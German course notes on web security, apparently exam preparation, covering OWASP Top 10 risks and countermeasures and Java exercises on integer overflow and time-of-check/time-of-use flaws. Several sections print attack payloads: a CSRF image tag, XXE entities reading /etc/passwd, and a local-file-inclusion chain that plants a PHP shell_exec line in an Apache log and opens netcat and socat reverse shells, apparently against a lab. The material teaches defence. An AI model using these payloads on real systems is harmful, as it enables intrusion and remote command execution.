    -   Verwende Positivliste bei der Eingabeprüfung “akzeptiere nur als
        gutartig bekannte Daten”
-   Ziehe die Positivliste (white list) immer der Negativliste (black
    list) vor
-   Ausgabekodierung
    -   Stelle sicher, dass alle Benutzereingaben als HTML- oder
        XML-Entitäten kodiert sind, bevor diese ausgegeben bzw.
        gerendert werden
    -   Die meisten Frameworks stellen Methoden zur Ausgabekodierung zur
        Verfügung (php hat htmlspecialchars() oder htmlentities())
-   Content-Security-Policy, teilt dem Browser mit, welche Domains er
    als Quelle von vertrauenswürdigem JavaScript-Code akzeptieren soll
    -   Verstöße werden in der Browser-Konsole gemeldet
    -   Ist CSP aktiv, wird in HTML-Dokumenten eingebetteter
        JavaScript-Code standardmäßig nicht mehr ausgeführt
    -   Deaktiviert standardmäßig auch die eval() Funktion von
        JavaScript
    -   Content-Security-Policy: default-src 'self' akzeptiert nur vom
        eigenen Server geladenen Code
    -   Events wie onclick funktionieren auch nicht mehr

Script mit Positivliste gegen lokales XSS

    <script>
        var pos=document.URL.indexOf("name=")+5;
        var name=document.URL.substring(pos, document.URL.length);
        if (name.match(/^[a-zA-Z0-9]$/)) {
            document.write(name);
        } else {
            window.alert("Security error");
        }
    </script>

Cross-Site-Request-Forgery

-   Ersetzen in einer Referenz in einem HTML-Dokument durch Referenz auf
    eine andere Web-Seite

-   Ein CSRF-Angriff zwingt den Browser eines Opfers, das sich korrekt
    authentifiziert hat, dazu, einen Request an eine verwundbare
    Webanwendung zu schicken, die dann die vom Angreifer gewünschte
    Aktion im Namen des Opfers ausführt

-   Beispiel

        <img src="http://www.example.com/transfer.do? frmAcct=document.form.frmAcct&toAcct=4345754& toSWIFTid=434343&amt=3434.43">

    Oben stehendes Tag kann auf Seite des Angreifers stehen und ist
    erfolgreich, wenn der Browser des Benutzers noch für das Online-
    Banking authentifiziert ist.

Hauptursache - Browser sendet Berechtigungen in Form von Cookies mit -
werden durch XSS begünstigt

Gegenmaßnahmen

-   Generieren von nicht vorhersagbaren Autorisierungstokens, welche
    nicht automatisch mitgesendet werden
-   Anschließend verifizieren, dass die abgeschickten Werte für Name und
    Wert für den aktuellen Benutzer korrekt sind
-   Vor sensiblen Aktionen erneute Authentifizierung einsetzen
-   SameSite-Attribut von Set-Cookie. Damit kann eingeschränkt werden,
    wann Cookies mitgesendet werden
-   Filter und Maskierungsfunktionen in PHP e.g. htmlspecialchars(),
    htmlentities()

A4: Unsicherer Entwurf

Der Entwurf berücksichtigt die Risiken für die zu entwickelnde Software
nicht angemessen im Kontext des Geschäftsumfelds, der Anwendungsfalls,
der Einsatzumgebung etc.

Konsequenz - Notwendige Sicherheitsmaßnahmen sind nicht im Entwurf
enthalten und werden dementsprechend auch nicht implementiert

Anmerkungen - Sicherer Entwurf kann durch Fehler in der Implementierung
trotzdem zu Schwachstellen führen - Ein unsicherer Entwurf lässt sich
selbst durch eine perfekte Implementierung nicht reparieren

Angriffsszenarien

-   Schwachstelle im Entwurf
    -   Einrichten neuer Zugriffsdaten erfolgt über zuvor hinterlegte
        Sicherheitsfragen
-   Angriff
    -   Social Engineering zum Ausfragen der Person, um die Personen zu
        erfragen
-   Problem
    -   Derartige Fragen und Antworten sind kein vertrauenswürdiger
        Nachweis für die Identität einer Person
-   Anmerkung
    -   Solche Sicherheitsfragen sind durch Standards- und
        De-Facto-Standards auch verboten
-   Schwachtstelle im Entwurf
    -   Es wurde nicht an Schutz vor Bots gedacht, d.h. die Anzahl an
        Transaktionen in einem kurzen Zeitraum wurde nicht begrenzt
-   Angriff
    -   Bots kaufen und verkaufen für mehr (scalpers)
-   Konsequenzen
    -   Rufschädigung
    -   Echte Käufer verärgert

Gegenmaßnahmen

-   Anforderungen und Ressourcenverwaltung
    -   Anforderungen einsammeln und besprechen
    -   Einbeziehen von Sicherheitsanforderungen
    -   Berücksichtigen, wie einfach die Anwendung zugreifbar ist
    -   Budget für alle Phasen einplanen
-   Sicherer Entwurf
    -   Permanente Evaluation
    -   Integrieren von Bedrohungsmodellierung
    -   Fehlerzustände in User Stories festlegen
-   Sicherer Software-Entwicklungszyklus
    -   Bedrohungsmodullierung
    -   Sichere Entwurfsmuster
    -   Bibliotheken mit sicheren Komponenten
    -   Sicherheitsexperten in allen Phasen eingebunden
    -   Hilfestellung durch OWASP Software Assurance Maturity Model
        (SAMM)
-   Implementierung
    -   Plausibilitätsprüfungen einbauen
    -   Unit- und Integrationtests
    -   Schichtentrennung
    -   Mandaten trennen
    -   Begrenzung des Ressourcenverbauchs durch Benutzer und Dienste

A5: Fehlerhafte Sicherheitskonfiguration

Konfigurationseinstellungen können zu Sicherheitslücken führen

-   Beispiele
    -   Unsauber definierte Berechtigungen für Cloud-Services
    -   Unnötige Funktionalität installiert und/oder aktiviert
        (Ports/Dienste/Benutzerkonten etc.)
    -   Standardbenutzerkonten und Standardpasswörter
    -   Detailinformationen (e.g. Stack Traces) in Fehlermeldungen
    -   System veraltet
    -   Keine sichere Vorbelegung
    -   Directory Listing aktiviert
-   Auswirkung
    -   Unberechtigter Zugriff auf Daten und Funktionen, manchmal sogar
        das ganze System

Gegenmaßnahmen

-   Implementierung von sicheren Installationsprozessen
    -   Wiederholbar, automatisierbar
    -   Verwendung einer minimalen Plattform
    -   Regelmäßige Updates
    -   Verwendung von SIcherheitsdirektiven wie Header-Fehler e.g. CSP,
        HSTS

XML External Entities (XXE)

-   Ablauf
    -   XML-Dokument enthält Verweis (URI) auf eine externe Entität
    -   XML-Dokument wird auf eine Web-Seite hochgeladen
    -   Web-Seite verarbeitet das XML-Dokument durch einen verwundbaren
        XML-Prozessor
    -   Der XML-Prozessor löst den Verweis auf die externe Entität auf
        und wertet diese aus
    -   Dadurch wird der Schadcode ausgeführt
-   Auswirkungen
    -   Auslesen von Daten
    -   Anfragen ausgehend vom übernommenen Server verschicken
    -   Interne Systeme “scannen”
    -   DoS
-   Angriff
    -   Auslesen von Dateien aus dem Dateisystem des Servers:

        <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>

    -   Durchführen von Anfragen auf Server, auf die ein Angreifer sonst
        nicht direkt zugreifen kann. Dadurch lassen sich auf Firewalls
        umgehen oder die Quelle von Angriffen wie Port-Scans
        verschleiern

        <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://server.com/path" >]> <foo>&xxe;</foo>
-   Ursachen
    -   Anwendunge akzeptiert direkt oder per Upload XML-Dokumente aus
        nicht vertrauenswürdigen Quellen
    -   Anwendung fügt nicht vertrauenswürdige Daten in XML-Dokumente
        ein
    -   SOAP vor 1.2
-   Gegenmaßnahmen
    -   Schwachstellen Scan durchführen
    -   Verwendung einfacher Datenformate e.g. JSON
    -   Serialisieren sensibler Daten vermeiden
    -   XML-Prozessoren Updaten
    -   SOAP aktualisieren
    -   Verarbeitung von externen XML-Entitäten ausschalten

A6: Nicht aktuelle Komponenten mit Schwachstellen

Anwendung enthält bekannte Schwachstellen, für die es vielleicht sogar
schon vorbereitete Angriffe (Exploits) gibt. Schwachstellen kommen
häufig durch die Verwendung von Drittkomponenten wie Frameworks oder
Bibliotheken in die Anwendung.

-   Beispiele
    -   Version direkt oder indirekt verwendeter Komponenten sind nicht
        bekannt
    -   Komponenten nicht aktuell oder werden nicht mehr gewartet
    -   Kein regelmäßiger Schwachstellenscan
    -   Kompatibilität von neuen Versionen wird nicht getestet
-   Auswirkungen
    -   Gering bis komplette Übernahme des Systems
-   Angriffsszenarien
    -   Komponenten laufen mit denselben Berechtigungen wie die
        Anwendung in denen sie verwendet werden. Verursacht durch
        e.g. Programmierfehler oder Backdoor
    -   Ermitteln von IoT-Komponenten mit bekannten Schwachstellen
        e.g. Heartbleed über eine Suchmaschine
-   Maßnahmen
    -   Entfernen von nicht verwendeten Abhängigkeiten und unnötiger
        Funktionalität
    -   Regelmäßige Inventarisierung
    -   OWASP Dependency Check durch Maven-Plugin e.g. mvn verify oder
        mvn org.owasp:dependency-check-maven:check
    -   Mitverfolgen von sicherheitsrelevanten Nachrichten
    -   Komponenten nur aus öffentlichen Quellen und aus sicheren
        Verbindungen beziehen
    -   Virtual Patching von nicht mehr maintainten Komponenten

A7: Fehlerhafte Identifizierung und Authentifizierung

Fehler bei der Bestätigung der Identität von Benutzern, der
Authentisierung oder der Sitzungsverwaltung

-   Beispiele
    -   Anwendung erlaubt brute-force Angriffe
    -   Anwendung verwendet Standardpasswörter oder schwache Passwörter
    -   Schwache Methode zum wiederherstellen des Zugangs nach
        Passwortverlust
    -   Speichern von Passwörtern im Klartext oder mit schwacher
        Hash-Funktion
    -   Keine Mehrfaktorauthentifizierung
    -   Fehlerhafte Sitzungsverwaltung (Session-ID in URL, Reuse von
        Session-IDs)
-   Angriffsszenarien
    -   Credential Stuffing (Brute Force mit dictionary)
    -   Erraten schwacher Passwörter
-   Maßnahmen
    -   Mehrfaktorauthentifizierung
    -   Anwendungen nie mit Standardzugangsdaten ausstatten
    -   Neue oder geänderte Passwörter auf ihre Stärke überprüfen. Auch
        prüfen, ob diese zu den 10.000 schlechtesten Passwörtern gehören
    -   Aktuelle Standards berücksichtigen
    -   Härtung gegen Enumeration Attacks
    -   Fehlgeschlagene Anmeldungsversuche begrenzen

Fehlerhaftes Session-Management

-   Bedrohung
    -   Angreifer übernimmt die Sitzung eines authentifizierten Nutzers
        Ursachen
    -   Zu einfache oder nicht verschlüsselte Passwörter
    -   Angreifer erhält Zugriff auf die Session ID - Keine
        Mehrfaktorauthentifizierung
-   Beispiele
    -   jsessionid in URL
        e.g. http://example.com/sale/saleitems;jsessionid=2P0OC2JDPXM0OQ SNDLPSKHCJUN2JV?dest=Hawaii
    -   Gültigkeitsdauer einer Sitzung zu lange
    -   Defizite beim Session-Management
    -   HTTP zustandslos
    -   Session vom Benutzer über mehrere Anfragen hinweg zu
        identifizieren
    -   Session-IDs als Authentisierungstokens
    -   Durchgängige verwendung von SSL
    -   Fehlende Cookie-Optionen (http-only, secure) oder fehlender
        session-timeout
    -   Session-IDs nicht ausreichend zufällig
    -   Schwache Passwörter
-   Schutz der Session ID
    -   Session-ID nur per SSL übertragen
    -   Zugriff auf Session-ID durch Clientseitige Skripte unterbinden
    -   Timeout für automatischen Logout setzen
    -   Cookie als “Tracking Mode” für die JSESSIONID konfigurieren
    -   Alle <http-method>-Tags entfernen
-   Beispiel durch Maßnahmen in web.xml

    <session-config> 
        <cookie-config> 
            <secure>
                 true 
            </secure> 
            <http-only>
                 true 
            </http-only> 
        </cookie-config> 
        <session-timeout> 
            15 
        </session-timeout> 
        <tracking-mode> 
            COOKIE 
        </tracking-mode> 
    </session-config>

-   Gegenmaßnahmen
    -   Brute Force durch ausprobieren von Passwörtern durch CAPTCHAs
        verhindern
    -   Schlechte Logout-Funktionalität absichern, indem
        Session-Informationen vollständig gelöscht werden
    -   Keine Passwörter im Klartext speichern, sondern auf
        Hash-Funktionen mit Salt verlassen
    -   Bei jedem Zugriff auf eine Seite im Intranet muss geprüft
        werden, ob eine Authentisierung stattgefunden hat

A8: Fehlerhafte Software und Datenintegrität

Treffen von Annahmen e.g. über Software-Updates, kritische Daten oder
CI/CD Pipelines ohne deren Gültigkeit zu überprüfen

-   Beispiele
    -   Anwendungen verwenden Bibliotheken aus nicht vertrauenswürdigen
        Quellen oder CDNs
    -   Durch unsichere CI/CD-Pipeline besteht Möglichkeit zum
        unberechtigten Zugriff
    -   Automatische Updates ohne Integritätsprüfung
-   Angriffsszenarien
    -   Update ohne Signatur
    -   Router oder andere Geräte prüfen oft nicht auf Signaturen und
        sind leichte Angriffsziele
    -   Solarwinds: Updates mit Schadcode
    -   Sichere Buildprozesse umgangen und Schadcode eingeschläust

Gegenmaßnahmen

-   Verwenden digitaler Signaturen
-   Sicherstellen, dass Dependencies aus vertauenswürdigen Repositories
    stammen
-   Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain
    eingesetzt werden e.g. OWASP Dependency Check
-   Review Process fÜr Code- und Konfigurationsänderungen
-   Saubere Trennung, Konfiguration und Zugangssteuerung in der CI/CD
    Pipeline
-   Serialisierte Daten nur signiert oder verschlüsselt übertragen

Unsichere Deserialisierung

Anwendunge enthäkt serialisierte Objekte/Datenstrukturen e.g. als XML-,
JSON- oder Binär-Dokumente und baut daraus durch Desieralisierung
entsprechen Objekte/Datenstrukturen wieder neu im eigenen Kontext auf

-   Die serialisierten Daten können manipuliert sein, um gezielt Werte
    zu verändern oder Code auf dem Zielsystem auszuführen
-   Anfällig sind e.g. 
    -   Fern- und Interprozesskommunikation: RPC und IPC
    -   Web Services
    -   Message Broker
    -   Caching- / Persistenz-Komponenten
    -   HTTP Cookies, HTML Formulare, Tokens zur Authentifizierung über
        APIs
-   Auswirkungen
    -   Komplette Übernahme des Zielsystems und eventuelle Ausbreitung
-   Angriffsszenarien
    -   Eine PHP-Anwendung verwendet Objektserialisierung, um
        “Super-Cookie” zu speichern
        a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
    -   Angreifer modifiziert das serialisierte Objekt, um sich selbst
        administrative Rechte zu geben
        a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
    -   Eine React-Anwendunge ruft verschiedene Spring-Boot
        Microservices auf
    -   Durch Verwendung des funktionales Programmierparadigmas soll der
        Code der Anwendung unveränderbar sein (immutable)
    -   Zur Realisierung wird der Anwendungszustand mit jeder Anfrage
        zwischen Client und Server serialisiert hin- und hergeschickt
        Angriff
    -   Einem Angreifer fällt die Java-Object-Signatur “R00” auf
    -   Der Angreifer verndet dann die “Java Serial Killer”-Erweiterung
        für Burp-Suite, um eigenen Code auf dem Server auszuführen
-   Gegenmaßnahmen
    -   Keine serialisierten Objekte aus nicht vertrauenswürdigen
        Quellen akzeptieren
    -   Nur Serialisierungsmedien verwenden, die ausschließlich
        primitive Datentypen erlauben
    -   Signaturen
    -   Typenprüfung
    -   Code zur Deserialisierung in isolierter Umgebung ausführen

A9: Fehlerhaftes Logging und Monitoring

Angriffe und Angriffsversuche werden nicht erkannt, wenn nicht alle
Aktionen protokolliert werden. Wenn Angreifer evtl. Zugriff auf
Log-Einträge haben, ist das Entwurfsmuster “Fehlerhafte
Berechtigungsprüfung” zu erkennen.

-   Beispiele
    -   Nicht protokollierte erfolgreiche und fehlgeschlagene
        Login-Versuche
    -   Nicht protokollierte Systemaktionen
    -   Fehler, Ausnahmen und Warnungen werden nicht oder nicht
        ausreichend protokolliert
    -   Log-Dateien werden nicht automatisiert auf verdächtiges
        Verhalten überwacht
    -   Logs werden nur lokal gespeichert
    -   Uhrzeiten sind nicht synchronisiert
    -   Es sind keine angemessenen Schwellwerte für das Auslösen von
        Alarmen festgelegt
    -   Es werden keine Alarme ausgelöst, wenn ein Pentest durchgeführt
        wird
    -   Angriffe werden nicht in Echtzeit erkannt
-   Angriffsszenarien
    -   Angreifer scannen eine Anwendung auf typische Passwörter und
        sehen nur fehlgeschlagene Logins
    -   Brute Force möglich
    -   Firma verwendet Sandbox zur Analyse von E-mail anhängen
    -   Schadsoftware wird in Anhang gepackt, erkannt, aber niemand
        kümmert sich darum

Gegenmaßnahmen

-   Sicherstellen, dass alle Vorgänge mit relevanten
    Kontextinformationen protokolliert werden (Logins, Fehlerhafte
    Logins, Eingabevalidierungsfehler, Fehler, IP, Session, Benutzer,
    Zeitstempel)
-   Lange genug speichern, um forensische Analyse durchführen zu können
-   Verwendung von Monitoring (SIEM, XDR, Elasticsearch, Kibana)
-   Verwendung eines standatisierten Log-Formats, damit diese einfach
    ausgewertet werden können
-   Log-Dateien append-only
-   Incident Response and Recovery Plan etablieren
-   Verwendung von Frameworks zum Schutz von Anwendungen (OWASP
    AppSensor, ModSecurity)

A10: Server-Side Request Forgery (SSRF)

Eine Anwendung lädt eine Resource (über das Netzwerk) anhand einer URL,
die vom Benutzer angegeben wird, ohne diese URL zu überprüfen

-   Beispiel
    -   Angreifer stellt einen Request zusammen und zwingt die Anwendung
        diese Request an ein Ziel zuschicken, welches so von der
        Anwendung nicht vorgesehen war
-   Probleme
    -   Funktioniert auch, wenn Schutzmechanismen vorhanden sind, wie
        e.g. 
        -   Web Application Firewall
        -   VPN
        -   Network Access Control List (ACL)
        -   Das Laden von Inhalten über URLs ist gerade in modernen
            Web-Anwendungen ein grundlegender Mechanismus, siehe AJAX
            oder fetch-API
-   Angriffsszenarien
    -   Scan der Ports interner Server
    -   Wenn das Netzwerk nicht segmentiert ist, können Angreifer die
        internen Systeme ermitteln und auch herausfinden, ob Ports auf
        internen Servern offen oder geschlossen sind
    -   Port-Scan funktioniert dadurch, dass die Ergebnisse von
        Verbindungen zu internen Servern mittels SSRF ausgewertet werden
    -   Abhängig vom Ergebnis oder der Responsetime ergibt sich dann, ob
        Port offen oder geschlossen ist
    -   Preisgabe von sensiblen Daten
    -   Angreifer können auf lokale Dateien oder interne Dienste
        zugreifen, um sensible Informationen zu gewinnen.
    -   Zugriff auf Metadatenspeicher von Cloud-Diensten
    -   Viele Cloud-Anbieter haben einen Metadatenspeicher
    -   Angreifer können mittels SSRF die Metadaten auslesen und so
        sensible Informationen gewinnen
    -   Kompromittiere interner Dienste
    -   Angreifer können interne Dienste missbrauchen, um weitere
        Angriffe durchzuführen (Remote Code Execution, DoS)

Gegenmaßnahmen

-   Mehrstufige Verteidigung
-   Maßnahmen auf Netzwerkebene
    -   Netzwerksegmentierung
    -   Deny by default
-   Maßnahmen auf Anwendungsebene
    -   Bereinigen und Validieren sämtlicher Eingabedaten, die vom
        Client kommen
    -   Positivlisten
    -   Keine Antworten im Reinformat senden
    -   HTTP-Umleitung ausschalten
-   Zusätzliche Maßnahmen
    -   Keine anderen sicherheitsrelevanten Diente auf System
        installieren, die direkt vom Internet aus zugänglich sind

File Inclusion

-   Anfälliger Code

    <?php
        $file = $_GET['page']; //The page we wish to display
        $ext = substr($file, strrpos($file, '.') + 1); // get file extension
        if($ext != "php") { // allow only php files for inclusion
        unset($file);
        }
        include($file);
    ?>

-   Angriff

    nc 172.17.0.1 80 # Connect via netcat
    <?php echo shell_exec($_GET['cmd']); ?> # Insert php into access.log

Dann lokal einen Listener starten:

Netcat:

    nc -lnvp 4242 # Listener starten

Socat:

    socat -dd TCP-LISTEN:4444 STDOUT

Im Browser, folgende URL verwenden:

Netcat:

    localhost/vulnerabilities/fi/?cmd=nc%20-e%20/bin/sh%20172.17.0.1%204242&page=../../../../../../../../var/log/apache2/access.log

Socat:

    localhost/vulnerabilities/fi/?cmd=socat%20TCP4:172.17.0.1:4444%20EXEC:/bin/bash&page=../../../../../../../../var/log/apache2/access.log

-   Gegenmaßnahmen

-   Eingabevalidierung

-   Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen
    Switch-case mit den möglichen Files

Aufgabe 5: Sichere Programmierung (secure coding) (10 Punkte)

Implementierung einer Datenstruktur in Java

Gegeben sei die folgende Definition einer Datenstruktur:

    List<String> data = new ArrayList<String>(MAX);

Dabei ist MAX folgendermaßen definiert:

    private static fional int MAX = 100;

Eine Methode mit der untenstehenden Signatur soll einen Wert an einer
bestimmten Position in der Datenstruktur data eintragen :

    void setElementToExtraPosition(int extra, String element);

Die Position soll berechnet werden aus der aktuellen Position (current)
und dem als Methodenparameter angegebenen Versatz (extra). Sowohl
current, als auch extra sollen vom Typ int sein.

Falls die neue Einfügeposition außerhalb des Wertebereichs der Indizes
der Datenstruktur liegt, soll eine Ausnahme (IllegalArgumentException)
ausgelöst werden.

Rufen Sie die Funktion setElementToExtraPosition() mit verschiedenen
Werten auf.

Was geschieht, wenn Sie folgende Werte verwenden:

    current = 50
    extra = Integer.MAX_VALUE:

Nehmen wir an, wir verwenden foldende Implementierung von
setElementToExtraPosition():

    if (extra < 0 || current + extra > MAX) {
        throw new IllegalArgumentException();
    }
    data.set(current + extra, element);

Wenn wir nun current = 50 und extra = Integer.MAX_VALUE setzen, stellen
wir fest, dass dies in unserer Implementierung zu einer
IndexOutOfBoundsException führt. Das liegt daran, dass das Problem erst
Auftritt, wenn wir current+extra addieren. current+extra overflowt in
den negativen Bereich. Das wird aber noch nicht geprüft. Da
current+extra in den negativen Bereich overflowt, wird der check
current+extra > MAX auch zu false evaluiert, was dazu führt, dass die
data.set() Methode den negativen Wert von current+extra bekommt und
daher die IndexOutOfBoundsException() wirft.

Was würde geschehen, wenn Sie ein Element auf Position current = 50
eintragen und anschließend ein Element auf der folgenden Position
eintragen:

    current + Integer.MIN_VALUE + Integer.MIN_VALUE 

Dies führt in der Implementierung zu keinem Fehler, da
current + Integer.MIN_VALUE + Integer.MIN_VALUE darauf deutet, dass
extra = Integer.MIN_VALUE + Integer.MIN_VALUE, was 0 ergibt.
current = 50 und extra=0 ist in allen Implementierungen valide und führt
daher zu keinem Problem. Das Problem liegt hier also nicht in der
Methode, sondern schon bei der Variablendeklaration.

    import java.math.BigInteger;
    import java.util.ArrayList;
    import java.util.List;

    public class IntegerOverflow {

        private static final int MAX = 100; // Integer.MAX_VALUE + 1

        private int current;
        private List<String> data;

        public IntegerOverflow() {
            current = 0;
            data = new ArrayList<String>(MAX);
            for (int i = 0; i < MAX; i++) {
                data.add(i,  "");
            }
        }

        public static void main(String[] args) {
            IntegerOverflow io = new IntegerOverflow();
            io.process();
        }

        private void process() {
            System.out.println("Liste im Initialzustand:");
            System.out.println(data.toString());

            current = 50; // Integer.MAX_VALUE

            data.set(current, "Alter Wert");
            System.out.println("\nListe nach Setzen eines Wertes auf Position current = " + current);
            System.out.println(data.toString());

            int extra = Integer.MAX_VALUE + Math.abs(Integer.MIN_VALUE) + 1;
    //      int extra = Math.abs(Integer.MIN_VALUE) + 1;
    //      int extra = Integer.MAX_VALUE;
    //      System.out.println("\nBerechnung des extra-Index durch Integer.MAX_VALUE + Math.abs(Integer.MIN_VALUE) + 1 = " + extra);
            System.out.println("\nextra-Index: = " + extra);

            setElementToExtraPosition(extra, "Neuer falscher Wert");
            System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));
            System.out.println(data.toString());

    //      setElementToExtraPositionMoreSecure(extra, "Neuer Wert More Secure");
    //      System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));
    //      System.out.println(data.toString());
    //
    //      setElementToExtraPositionSecure(extra, "Neuer Wert Secure");
    //      System.out.println("\nListe nach Setzen eines Wertes auf Position current (" + current + ") + extra (" + extra + ") = " + (current + extra));
    //      System.out.println(data.toString());

        }

        private void setElementToExtraPosition(int extra, String element) {
    //      System.out.println("current + extra = " + (current + extra));
            if (extra < 0 || current + extra > MAX) {
                throw new IllegalArgumentException();
            }
            data.set(current + extra, element);
        }

        private void setElementToExtraPositionMoreSecure(int extra, String element) {
            if (extra < 0 || current > MAX - extra) {
                throw new IllegalArgumentException();
            }
            data.set(current + extra, element);
        }

        private void setElementToExtraPositionSecure(int extra, String element) {
            BigInteger currentBig = BigInteger.valueOf(current);
            BigInteger maxBig = BigInteger.valueOf(MAX);
            BigInteger extraBig = BigInteger.valueOf(extra);
            if (extra < 0 || currentBig.add(extraBig).compareTo(maxBig) > 0) {
                throw new IllegalArgumentException();
            }
            data.set(current + extra, element);
        }
    }

Secure Coding

Implementieren Sie die mit TODO markierten stellen

Das Vorhandensein eines AttackThreads gibt Ihnen einen Hinweis worauf
Sie in Ihren Implementierungen achten sollten.

Was müssen Sie noch in Ihrer Implementierung beachten?

Nach dem validatePerson() check in speicherePerson() schläft der Thread
für 3 Sekunden, bevor die Person gespeichert wird. Innerhalb dieser 3
Sekunden ändert der Attacker nun die Felder der Person, welche nicht
mehr validiert werden muss, da diese bereits als valide eingestuft
wurde. Dies ist eine klassische Time of Check vs. Time of Use
Schwachstelle. Man kann dafür sorgen, dass die Person dennoch richtig
gespeichert wird, indem man eine Kopie des Objektes direkt bei
Methodenaufruf erstellt und intern nur noch mit dieser Kopie arbeitet.
Der Angreifer ändert nun zwar die Felder des person Objektes aus der
main, aber da wir unsere, bereits validierte person verwenden, deren
Felder der Angreifer nicht bearbeiten kann, speichern wir schlussendlich
das Objekt mit den richtigen Feldern.

Person.java

    package toctou_solution;

    public class Person {

        private String username;
        private String passwort;
        private Double gewicht;

        public Person(String username, String passwort, Double gewicht) {
            super();
            this.username = username;
            this.passwort = passwort;
            this.gewicht = gewicht;
        }

        public String getUsername() {
            return username;
        }

        public void setUsername(String username) {
            this.username = username;
        }

        public String getPasswort() {
            return passwort;
        }

        public void setPasswort(String passwort) {
            this.passwort = passwort;
        }

        public Double getGewicht() {
            return gewicht;
        }

        public void setGewicht(Double gewicht) {
            this.gewicht = gewicht;
        }

        @Override
        public String toString() {
            return "Person [username=" + username + ", passwort=" + passwort + ", gewicht=" + gewicht + "]";
        }
    }

TOCTOU.java

    package toctou_solution;

    import java.util.logging.Logger;

    import toctou.exception.PersonException;

    public class TOCTOU {

        private static Logger logger = Logger.getLogger(TOCTOU.class.getName());

        class AttackThread extends Thread {

            private Person person;

            public AttackThread(Person p) {
                this.person = p;
            }

            @Override
            public void run() {
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                person.setPasswort("pwnd");
                person.setGewicht(1000.0d);
            }
        }

        private boolean validatePerson(Person p) {
            // TODO: Rufen Sie die entsprechenden Methoden der Klasse Validator auf.
            logger.info("Validiere Person : " + p);
            Validator v = Validator.getInstance();
            if (!v.checkValidString(p.getUsername())) {
                return false;
            }
            if (!v.checkValidPassword(p.getPasswort())) {
                return false;
            }
            if (!v.checkValidDouble(p.getGewicht())) {
                return false;
            }
            return true;
        }

        public void speicherePerson(Person p) throws PersonException {
            // TODO: Validieren Sie das Argument p durch Aufruf der Methode validatePerson()
            // Remove the following line of code to demonstrate a successful attack.
            Person person = new Person(p.getUsername(), p.getPasswort(), p.getGewicht());
            if (!validatePerson(person)) {
                throw new PersonException("Person enthält ungültige Werte: " + person);
            }
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            logger.info("Person " + person + " erfolgreich gespeichert.");
        }

        public static void main(String[] args) {
            TOCTOU t = new TOCTOU();
            Person person = new Person("sheldon", "abc123xyz!", 73.0);
            AttackThread at = t.new AttackThread(person);
            at.start();
            try {
                t.speicherePerson(person);
            } catch (PersonException e) {
                // person.setUsername("xxxxxxxxxxxxx");
                // person.setUsername(null);
                // person.setPasswort("xxxxxxxxxxxxx");
                // person.setPasswort(null);
                // person.setGewicht(0.0);
                // person = null;
                logger.warning(e.getMessage());
            }

            try {
                at.join();
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            System.out.println("Inhalt von Person am Ende des Programms: " + person);
        }
    }

Validator.java

    package toctou_solution;

    public class Validator {
        private static Validator validator = new Validator();

        public static Validator getInstance() {
            return validator;
        }

        public boolean checkValidString(String s) {
            // TODO: Implementieren Sie die Prüfung von Zeichenketten so, dass
            //       1. null-Strings und leere Zeichenketten NICHT erlaubt sind
            //       2. nur Klein- und Großbuchstaben erlaubt sind.
            //       Zeichenketten dürfen eine beliebige Länge haben.
            if (s == null) {
                return false;
            }
            String pattern = "[a-zA-Z]+";
            return s.matches(pattern);
        }

        public boolean checkValidPassword(String s) {
            // TODO: Implementieren Sie die Prüfung von Passwörtern so, dass
            //       1. null-Strings und leere Zeichenketten NICHT erlaubt sind
            //       2. ein Passwort mindestens 10 Zeichen haben muss.
            if (s == null || s.trim().isEmpty()) {
                return false;
            }
            if (s.length() < 10) {
                return false;
            }
            return true;
        }

        public boolean checkValidDouble(Double d) {
            // TODO: Implementieren Sie die Prüfung von Gewichtsangaben so, dass das Gewicht zwischen 0.0 und 300.0 Kg liegen muss.
            if (d == null) {
                return false;
            }
            if (d < 0.0d || d > 300.0d) {
                return false;
            }
            return true;
        }
    }

Aufgabe 6: Authentisierung/Authentifizierung (3+2 = 5 Punkte)

Grundlagen

Authentisierung

-   Nachweis einer Eigenschaft / Bezeugung der Echtheit
-   i.d.R.
    -   Sicherstellung der Identität
    -   Nachweis einer Person, dass sie tatsächlich diejenige Person
        ist, die sie vorgibt zu sein
    -   Person legt also Nachweise vor, die ihre Identität bestätigen
        sollen
    -   Beantwortung der Frage “Wer bin ich?”

Authentifizierung

-   Prüfung der behaupteten Authentisierung / Vorgang der
    Echtheitsprüfung
-   Verifizieren der behaupteten Eigenschaft durch Überprüfen der
    vorgelegten Nachweise
-   Authentifizierung gilt solange, bis der betreffende Kontext bzw.
    betreffende Modus verlassen oder verändert wird

[AuthN]

Autorisierung

-   Einräumen von speziellen Rechten für authentifizierte Personen /
    Systeme
-   Zuweisung von Rechten in Abhängigkeit der jeweiligen Identität
-   Rolle r hat Berechtigung b

Authentisierungsmethoden

-   Wissen: Passwort, PIN
-   Besitz: Token, Zertifikat
-   Eigenschaften: Biometrische Daten

Starke Authentisierung

-   keine statischen Passwörter
-   keine schwachen Passwörter
-   Mehrfaktor Authentifizierung
    -   Kombinationen von Wissen, Besitz und Eigenschaften
-   Nicht abhörbar (e.g. Einmalpasswörter)

OAuth2

Definition

-   Sammlung von Spezifikationen für den Tokenbasierten Zugriff auf
    Ressourcen über HTTP

Rollen

[Rollen]

Standardprotokoll

[Standardprotokoll]

[Kategorien]

Authorization Code Grant + PKCE Flow

-   Eintauschen eines Autorisierungs-Codes (authorization code) gegen
    eine Zugriffsberechtigung (access token)

